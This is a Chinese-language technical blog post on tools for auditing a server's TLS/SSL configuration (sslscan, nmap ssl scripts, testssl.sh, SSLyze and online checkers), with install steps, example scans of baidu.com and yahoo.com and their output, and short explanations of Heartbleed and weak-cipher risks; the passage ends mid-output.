        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>工作中需要检测服务所用的TLS套件版本等，可以用以下几种工具</p><a id="more"></a><h2 id="1-工具汇总"><a href="#1-工具汇总" class="headerlink" title="1 工具汇总"></a>1 工具汇总</h2><p><strong>ssllabs</strong><br>强烈推荐这个网站,简洁直观,非常好<br><a href="https://www.ssllabs.com/">https://www.ssllabs.com/</a></p><p><strong>htbridge</strong><br>这个网站检测全面,SSL检测项目更新最快<br><a href="https://www.htbridge.com/ssl/">https://www.htbridge.com/ssl/</a></p><p><strong>myssl</strong><br>这个网站是中国特供,国内访问速度最快,并提供对各大国产浏览器的SSL检测<br><a href="https://myssl.com/">https://myssl.com</a></p><p><strong>testssl</strong> </p><p>非常全的工具 <a href="https://testssl.sh/">https://testssl.sh/</a> </p><h2 id="2-sslscan"><a href="#2-sslscan" class="headerlink" title="2  sslscan"></a>2  sslscan</h2><ul><li>是否支持TLS Fallback SCSV</li><li>是否支持压缩</li><li>是否有心脏滴血漏洞（heartbleed）</li><li>支持的密码套件（及服务器优选的preferred, 红色表示不安全算法，黄色代表中等强度的算法 ）</li><li>证书信息</li></ul><h3 id="2-1-安装"><a href="#2-1-安装" class="headerlink" title="2.1 安装"></a>2.1 安装</h3><p>（1）下载源码</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># git clone https://github.com/rbsec/sslscan</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）进入目录</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localname~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd sslscan</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）编译安装</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localname sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># make static</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）查看是否编译成功</p><pre class="line-numbers language-bash"><code class="language-bash">   <span class="token punctuation">[</span>root@localhost sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#./sslscan -version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/08/26/htps-tools/1597831322514.png" alt="1597831322514"></p><h3 id="2-2-使用"><a href="#2-2-使用" class="headerlink" title="2.2 使用"></a>2.2 使用</h3><p> [root@localhost sslscan]# ./sslscan –tlsall <a href="http://www.baidu.com:443/">www.baidu.com:443</a></p><p>​    OR</p><p>  [root@localhost sslscan]# ./sslscan –tlsall 192.168.5.200   —-假如192.168.5.200是你的服务器IP</p><p>​    PS：上述两个命令的前提是能够ping通。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname sslscan<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./sslscan --tlsall www.baidu.com:443</span>Version: 2.0.0-staticOpenSSL 1.1.1h-dev  xx XXX xxxxConnected to 180.97.34.96Testing SSL server www.baidu.com on port 443 using SNI name www.baidu.com  SSL/TLS Protocols:TLSv1.0   enabledTLSv1.1   enabledTLSv1.2   enabledTLSv1.3   disabled  TLS Fallback SCSV:Server supports TLS Fallback SCSV  TLS renegotiation:Secure session renegotiation supported  TLS Compression:Compression disabled  Heartbleed:TLSv1.2 not vulnerable to heartbleedTLSv1.1 not vulnerable to heartbleedTLSv1.0 not vulnerable to heartbleed  Supported Server Cipher<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.2  128 bits  AES128-SHA                   Accepted  TLSv1.2  256 bits  AES256-SHA                   Accepted  TLSv1.2  128 bits  RC4-SHA                      Preferred TLSv1.1  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.1  128 bits  AES128-SHA                   Accepted  TLSv1.1  256 bits  AES256-SHA                   Accepted  TLSv1.1  128 bits  RC4-SHA                      Preferred TLSv1.0  128 bits  ECDHE-RSA-RC4-SHA             Curve P-256 DHE 256Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256Accepted  TLSv1.0  128 bits  AES128-SHA                   Accepted  TLSv1.0  256 bits  AES256-SHA                   Accepted  TLSv1.0  128 bits  RC4-SHA                        Server Key Exchange Group<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:TLSv1.2  128 bits  secp256r1 <span class="token punctuation">(</span>NIST P-256<span class="token punctuation">)</span>  Server Signature Algorithm<span class="token punctuation">(</span>s<span class="token punctuation">)</span>:TLSv1.2  Server accepts all signature algorithms.  SSL Certificate:Signature Algorithm: sha256WithRSAEncryptionRSA Key Strength:    2048Subject:  baidu.comAltnames: DNS:baidu.com, DNS:baifubao.com, DNS:www.baidu.cn, DNS:www.baidu.com.cn, DNS:mct.y.nuomi.com, DNS:apollo.auto, DNS:dwz.cn, DNS:*.baidu.com, DNS:*.baifubao.com, DNS:*.baidustatic.com, DNS:*.bdstatic.com, DNS:*.bdimg.com, DNS:*.hao123.com, DNS:*.nuomi.com, DNS:*.chuanke.com, DNS:*.trustgo.com, DNS:*.bce.baidu.com, DNS:*.eyun.baidu.com, DNS:*.map.baidu.com, DNS:*.mbd.baidu.com, DNS:*.fanyi.baidu.com, DNS:*.baidubce.com, DNS:*.mipcdn.com, DNS:*.news.baidu.com, DNS:*.baidupcs.com, DNS:*.aipage.com, DNS:*.aipage.cn, DNS:*.bcehost.com, DNS:*.safe.baidu.com, DNS:*.im.baidu.com, DNS:*.baiducontent.com, DNS:*.dlnel.com, DNS:*.dlnel.org, DNS:*.dueros.baidu.com, DNS:*.su.baidu.com, DNS:*.91.com, DNS:*.hao123.baidu.com, DNS:*.apollo.auto, DNS:*.xueshu.baidu.com, DNS:*.bj.baidubce.com, DNS:*.gz.baidubce.com, DNS:*.smartapps.cn, DNS:*.bdtjrcv.com, DNS:*.hao222.com, DNS:*.haokan.com, DNS:*.pae.baidu.com, DNS:*.vd.bdstatic.com, DNS:click.hm.baidu.com, DNS:log.hm.baidu.com, DNS:cm.pos.baidu.com, DNS:wn.pos.baidu.com, DNS:update.pan.baidu.comIssuer:   GlobalSign Organization Validation CA - SHA256 - G2Not valid before: Apr  2 07:04:58 2020 GMTNot valid after:  Jul 26 05:31:02 2021 GMT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-sslscan原理"><a href="#2-3-sslscan原理" class="headerlink" title="2.3 sslscan原理"></a>2.3 sslscan原理</h3><p> ① sslscan通过创建多个https的连接来试探服务器支持的加密方式；</p><p>   ② 当使用https连接到服务器的时候，会交换双方所支持的加密方式，之后选择双发都能支持的方式进行通信；</p><p>​      如果https服务器配置不当，就会存在MITM攻击，攻击者就可以通过客户端支持的弱加密算法来欺骗服务器；</p><p>​      假如使用的是SSLV2的56位DES，当攻击者拦截并使用了这种加密流量过后，可能在很短时间之内就能够破解加密密钥。</p><h3 id="2-4-功能"><a href="#2-4-功能" class="headerlink" title="2.4 功能"></a>2.4 功能</h3><p> ① sslscan能够检测heartbleed，这是一个openssl的漏洞；</p><p>​      heartbleed漏洞存在于OpenSSL TSL中，它由一个缓冲区导致，允许从内存中读取数据；实际上，Heartbleed 可以在任何未装补丁的支持 TLS 的 OpenSSL （1.0.1 到 1.0.1f 之间）服务器上利用；它从服务器内存中读取 64 KB 的纯文本数据，这能够重复执行，服务器上不会留下任何踪迹或日志。 这意味着攻击者可以从服务器读取纯文本信息，包括服务器的的私钥或者加密方式，会话 Cookie 或 HTTPS 请求会包含用户的密码或其它敏感信息。</p><h2 id="3-nmap"><a href="#3-nmap" class="headerlink" title="3 nmap"></a>3 nmap</h2><p> <a href="https://jumpnowtek.com/security/Using-nmap-to-check-certs-and-supported-algos.html">https://jumpnowtek.com/security/Using-nmap-to-check-certs-and-supported-algos.html</a> </p><p>查看证书</p><p>支持的密码套件</p><p>检测漏洞：心脏滴血 Poodle drown 等漏洞</p><h3 id="3-1-安装"><a href="#3-1-安装" class="headerlink" title="3.1 安装"></a>3.1 安装</h3><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> nmap    <span class="token comment" spellcheck="true">#输入y安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-2-使用"><a href="#3-2-使用" class="headerlink" title="3.2 使用"></a>3.2 使用</h3><p>（1）查看证书nmap –script ssl-cert -p 443 baidu.com</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># nmap --script ssl-cert -p 443 baidu.com</span>Starting Nmap 6.40 <span class="token punctuation">(</span> http://nmap.org <span class="token punctuation">)</span> at 2020-08-20 16:22 CSTNmap scan report <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>39.156.69.79<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0085s latency<span class="token punctuation">)</span>.Other addresses <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: 220.181.38.148PORT    STATE SERVICE443/tcp <span class="token function">open</span>  https<span class="token operator">|</span> ssl-cert: Subject: commonName<span class="token operator">=</span>www.baidu.cn/organizationName<span class="token operator">=</span>BeiJing Baidu Netcom Science Technology Co., Ltd/stateOrProvinceName<span class="token operator">=</span>Beijing/countryName<span class="token operator">=</span>CN<span class="token operator">|</span> Issuer: commonName<span class="token operator">=</span>DigiCert SHA2 Secure Server CA/organizationName<span class="token operator">=</span>DigiCert Inc/countryName<span class="token operator">=</span>US<span class="token operator">|</span> Public Key type: rsa<span class="token operator">|</span> Public Key bits: 2048<span class="token operator">|</span> Not valid before: 2020-02-27T00:00:00+00:00<span class="token operator">|</span> Not valid after:  2021-02-26T12:00:00+00:00<span class="token operator">|</span> MD5:   d0cf b084 759f 231b 9b22 c197 6bd5 d271<span class="token operator">|</span>_SHA-1: e357 f6c5 b7d3 7464 8055 89c9 3797 c98d 9d38 2497Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 0.60 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）查看支持的TLS密码套件nmap –script ssl-enum-ciphers -p 443 baidu.com</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localname ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># nmap --script ssl-enum-ciphers -p 443 baidu.com</span>Starting Nmap 6.40 <span class="token punctuation">(</span> http://nmap.org <span class="token punctuation">)</span> at 2020-08-20 16:23 CSTNmap scan report <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>220.181.38.148<span class="token punctuation">)</span>Host is up <span class="token punctuation">(</span>0.0093s latency<span class="token punctuation">)</span>.Other addresses <span class="token keyword">for</span> baidu.com <span class="token punctuation">(</span>not scanned<span class="token punctuation">)</span>: 39.156.69.79PORT    STATE SERVICE443/tcp <span class="token function">open</span>  https<span class="token operator">|</span> ssl-enum-ciphers: <span class="token operator">|</span>   SSLv3: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.0: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.1: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>   TLSv1.2: <span class="token operator">|</span>     ciphers: <span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 - strong<span class="token operator">|</span>       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_128_GCM_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_CBC_SHA256 - strong<span class="token operator">|</span>       TLS_RSA_WITH_AES_256_GCM_SHA384 - strong<span class="token operator">|</span>       TLS_RSA_WITH_RC4_128_SHA - strong<span class="token operator">|</span>     compressors: <span class="token operator">|</span>       NULL<span class="token operator">|</span>_  least strength: strongNmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 2.23 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>(3) More</p><p>您还可以使用Nmap脚本查找众所周知的ssl和tls漏洞</p><ul><li><a href="https://nmap.org/nsedoc/scripts/ssl-ccs-injection.html">ssl-ccs-injection</a>：允许MITM攻击的连接设置错误（<a href="http://ccsinjection.lepidum.co.jp/">ccs-injection-vuln</a>，<a href="https://www.tripwire.com/state-of-security/vulnerability-management/openssl-ccs-injection-primer/">ccs-injection-primer</a>）</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-cert-intaddr.html">ssl-cert-intaddr</a>：内部IP地址泄漏</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-date.html">ssl-date</a>：远程服务器时间泄漏</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-dh-params.html">ssl-dh-params</a>：使用弱<a href="https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange">Diffie-Hellman</a>参数</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">ssl-heartbleed</a>：易受OpenSSL <a href="https://www.us-cert.gov/ncas/alerts/TA14-098A">Heartbleed </a><a href="https://nmap.org/nsedoc/scripts/ssl-heartbleed.html">攻击</a></li><li><a href="https://nmap.org/nsedoc/scripts/ssl-known-key.html">ssl-known-key</a>：服务器正在使用已知的错误证书</li><li><a href="https://nmap.org/nsedoc/scripts/ssl-poodle.html">ssl-poodle</a>：服务器允许易受攻击的SSLv3 CBC密码（<a href="https://www.us-cert.gov/ncas/alerts/TA14-290A">POODLE</a>）</li><li><a href="https://nmap.org/nsedoc/scripts/sslv2.html">sslv2</a>：服务器允许使用过时的SSLv2密码</li><li><a href="https://nmap.org/nsedoc/scripts/sslv2-drown.html">sslv2-drown</a>：服务器允许与<a href="https://www.us-cert.gov/ncas/current-activity/2016/03/01/SSLv2-DROWN-Attack">DROWN</a>攻击相关的SSLv2密码</li></ul><h2 id="4-testssl"><a href="#4-testssl" class="headerlink" title="4 testssl"></a>4 testssl</h2><p>testssl.sh是我们首选的测试工具，它涵盖了TLS和SSL评估所需的所有测试所需工具，并定期更新。</p><h3 id="4-1-安装"><a href="#4-1-安装" class="headerlink" title="4.1 安装"></a>4.1 安装</h3><pre><code>git clone https://github.com/drwetter/testssl.sh.git</code></pre><h3 id="4-2-testssl-sh示例"><a href="#4-2-testssl-sh示例" class="headerlink" title="4.2 testssl.sh示例"></a>4.2 testssl.sh示例</h3><p>有许多可以用于testssl.sh的测试选项，您应该使用的选项将在很大程度上取决于您的测试要求。以下是部分有关testssl.sh命令行选项的示例。运行./testssl.sh可以看到所有选项。详情见 <a href="https://testssl.sh/">https://testssl.sh/</a> </p><pre><code>[root@m01ly ~]#  cd testssl.sh[root@m01ly testssl.sh]# ./testssl.sh -e www.baidu.com</code></pre><p>它是在CentOS 7上运行的, 如果你遇到相同的问题, 则可以通过以下方法解决它。Fatal error: Neither “dig”, “host”, “drill” or “nslookup” is present<img src="/2020/08/26/htps-tools/1614074377668.png" alt="1614074377668"></p><p><strong>solution：</strong>当程序找不到任何实用程序来解析IP或域时, 就会发生这种情况。你可以安装bind-utils来修复错误。</p><pre class="line-numbers language-bash"><code class="language-bash">yum <span class="token function">install</span> bind-utils -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-0-测试单个主机上的TLS版本并输出到控制台"><a href="#4-2-0-测试单个主机上的TLS版本并输出到控制台" class="headerlink" title="4.2.0 测试单个主机上的TLS版本并输出到控制台"></a>4.2.0 测试单个主机上的TLS版本并输出到控制台</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -p TARGET-HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-2-测试单个主机上的所有内容并输出到HTML"><a href="#4-2-2-测试单个主机上的所有内容并输出到HTML" class="headerlink" title="4.2.2 测试单个主机上的所有内容并输出到HTML"></a>4.2.2 测试单个主机上的所有内容并输出到HTML</h4><h4 id="4-2-1-测试单个主机上的所有内容并输出到控制台"><a href="#4-2-1-测试单个主机上的所有内容并输出到控制台" class="headerlink" title="4.2.1 测试单个主机上的所有内容并输出到控制台"></a>4.2.1 测试单个主机上的所有内容并输出到控制台</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-2-测试单个主机上的所有内容并输出到HTML-1"><a href="#4-2-2-测试单个主机上的所有内容并输出到HTML-1" class="headerlink" title="4.2.2 测试单个主机上的所有内容并输出到HTML"></a>4.2.2 测试单个主机上的所有内容并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-2-3测试子网上的所有主机并输出到HTML"><a href="#4-2-3测试子网上的所有主机并输出到HTML" class="headerlink" title="4.2.3测试子网上的所有主机并输出到HTML"></a>4.2.3测试子网上的所有主机并输出到HTML</h4><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U 192.168.1.0/24 <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>与上述相同，但只列举每个服务器支持的密码类型：</p><pre class="line-numbers language-bash"><code class="language-bash">./testssl.sh -E 192.168.1.0/24 <span class="token operator">|</span> aha<span class="token operator">></span> OUTPUT-FILE.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有很多功能。</p><h2 id="5-SSLyze"><a href="#5-SSLyze" class="headerlink" title="5 SSLyze"></a>5 SSLyze</h2><h3 id="5-1-安装"><a href="#5-1-安装" class="headerlink" title="5.1 安装"></a>5.1 安装</h3><pre class="line-numbers language-bash"><code class="language-bash">$ pip <span class="token function">install</span> --upgrade setuptools$ pip <span class="token function">install</span> --upgrade sslyze<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="5-2-使用"><a href="#5-2-使用" class="headerlink" title="5.2 使用"></a>5.2 使用</h3><pre class="line-numbers language-bash"><code class="language-bash">$ python -m sslyze --regular www.yahoo.com:443 www.google.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"> SCAN RESULTS FOR WWW.YAHOO.COM:443 - 202.165.107.50 --------------------------------------------------- * Deflate Compression:                                          OK - Compression disabled * SSLV3 Cipher Suites:      Server rejected all cipher suites. * TLSV1 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  * Session Renegotiation:       Client-initiated Renegotiation:    OK - Rejected       Secure Renegotiation:              OK - Supported * OpenSSL CCS Injection:                                          OK - Not vulnerable to OpenSSL CCS injection * SSLV2 Cipher Suites:      Server rejected all cipher suites. * Certificate Information:     Content       SHA1 Fingerprint:                  3672d010de4097e1d06898229df2821a1b49a2a1       Common Name:                       *.www.yahoo.com       Issuer:                            DigiCert SHA2 High Assurance Server CA       Serial Number:                     9093429354078714021559623999443547105       Not Before:                        2020-05-11 00:00:00       Not After:                         2020-11-07 12:00:00       Signature Algorithm:               sha256       Public Key Algorithm:              EllipticCurve       Key Size:                          256       Curve:                             secp256r1       DNS Subject Alternative Names:     <span class="token punctuation">[</span>u<span class="token string">'yahoo.com'</span>, u<span class="token string">'*.yahoo.com'</span>, u<span class="token string">'*.www.yahoo.com'</span>, u<span class="token string">'mbp.yimg.com'</span>, u<span class="token string">'*.media.yahoo.com'</span>, u<span class="token string">'brb.yahoo.net'</span>, u<span class="token string">'*.att.yahoo.com'</span>, u<span class="token string">'s.yimg.com'</span>, u<span class="token string">'*.amp.yimg.com'</span>, u<span class="token string">'fr-ca.rogers.yahoo.com'</span>, u<span class="token string">'tw.rd.yahoo.com'</span>, u<span class="token string">'ddl.fp.yahoo.com'</span>, u<span class="token string">'ca.rogers.yahoo.com'</span>, u<span class="token string">'ca.my.yahoo.com'</span>, u<span class="token string">'add.my.yahoo.com'</span>, u<span class="token string">'*.global.vespa.oath.cloud'</span>, u<span class="token string">'hk.rd.yahoo.com'</span><span class="token punctuation">]</span>     Trust       Hostname Validation:               OK - Certificate matches www.yahoo.com       Android CA Store <span class="token punctuation">(</span>8.1.0_r9<span class="token punctuation">)</span>:       OK - Certificate is trusted       iOS CA Store <span class="token punctuation">(</span>11<span class="token punctuation">)</span>:                 OK - Certificate is trusted       Java CA Store <span class="token punctuation">(</span>jre-10.0.2<span class="token punctuation">)</span>:        OK - Certificate is trusted       macOS CA Store <span class="token punctuation">(</span>High Sierra<span class="token punctuation">)</span>:      OK - Certificate is trusted       Mozilla CA Store <span class="token punctuation">(</span>2018-04-12<span class="token punctuation">)</span>:     OK - Certificate is trusted       Windows CA Store <span class="token punctuation">(</span>2018-06-30<span class="token punctuation">)</span>:     OK - Certificate is trusted       Symantec 2018 Deprecation:         OK - Not a Symantec-issued certificate       Received Chain:                    *.www.yahoo.com --<span class="token operator">></span> DigiCert SHA2 High Assurance Server CA       Verified Chain:                    *.www.yahoo.com --<span class="token operator">></span> DigiCert SHA2 High Assurance Server CA --<span class="token operator">></span> DigiCert High Assurance EV Root CA       Received Chain Contains Anchor:    OK - Anchor certificate not sent       Received Chain Order:              OK - Order is valid       Verified Chain contains SHA1:      OK - No SHA1-signed certificate <span class="token keyword">in</span> the verified certificate chain     Extensions       OCSP Must-Staple:                  NOT SUPPORTED - Extension not found       Certificate Transparency:          WARNING - Only 2 SCTs included but Google recommends 3 or <span class="token function">more</span>     OCSP Stapling       OCSP Response Status:              successful       Validation w/ Mozilla Store:       OK - Response is trusted       Responder Id:                      5168FF90AF0207753CCCD9656462A212B859723B       Cert Status:                       good       Cert Serial Number:                06D754AE96D28371A4DEF60AC211B3E1       This Update:                       Aug 19 15:03:00 2020 GMT       Next Update:                       Aug 26 14:18:00 2020 GMT * Resumption Support:      With Session IDs:                  NOT SUPPORTED <span class="token punctuation">(</span>0 successful, 5 failed, 0 errors, 5 total attempts<span class="token punctuation">)</span>.      With TLS Tickets:                  OK - Supported * TLSV1_1 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA              ECDH-256 bits  256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_256_CBC_SHA                      -              256 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA              ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                         TLS_RSA_WITH_AES_128_CBC_SHA                      -              128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                  * TLSV1_3 Cipher Suites:      Server rejected all cipher suites. * OpenSSL Heartbleed:                                          OK - Not vulnerable to Heartbleed * Downgrade Attacks:       TLS_FALLBACK_SCSV:                 OK - Supported * ROBOT Attack:                                          OK - Not vulnerable * TLSV1_2 Cipher Suites:       Forward Secrecy                    OK - Supported       RC4                                OK - Not Supported     Preferred:        TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256           ECDH-256 bits  128 bits      HTTP 302 Found - https://hk.yahoo.com/?p<span class="token operator">=</span>us                      Accepted:        RSA_WITH_AES_256_CCM_8                            -              256 bits      HTTP 302 Found - 